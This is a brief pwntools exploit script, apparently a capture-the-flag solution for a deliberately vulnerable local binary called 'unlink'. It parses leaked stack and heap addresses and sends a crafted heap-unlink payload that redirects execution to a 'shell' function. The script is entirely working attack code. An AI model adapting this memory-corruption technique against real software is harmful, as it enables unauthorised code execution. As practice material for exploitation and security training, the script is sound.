from pwn import *

context.log_level='debug'
p=process('./unlink');
#context.terminal = ['gnome-terminal','-x','sh','-c']
#gdb.attach(proc.pidof(p)[0])

elf=ELF('unlink')
shell_addr=elf.symbols['shell']
print 'shell_addr: ' + hex(shell_addr)

p.recvuntil('here is stack address leak: ')
stack_addr=int(p.recv(10),16)
p.recvuntil('here is heap address leak: ')
heap_addr=int(p.recv(9),16)
print 'stack_addr: ' + hex(stack_addr)
print 'heap_addr: ' + hex(heap_addr)

payload=p32(shell_addr)+'A'*12+p32(heap_addr+12)+p32(stack_addr+0x10)
p.sendline(payload)
p.interactive();
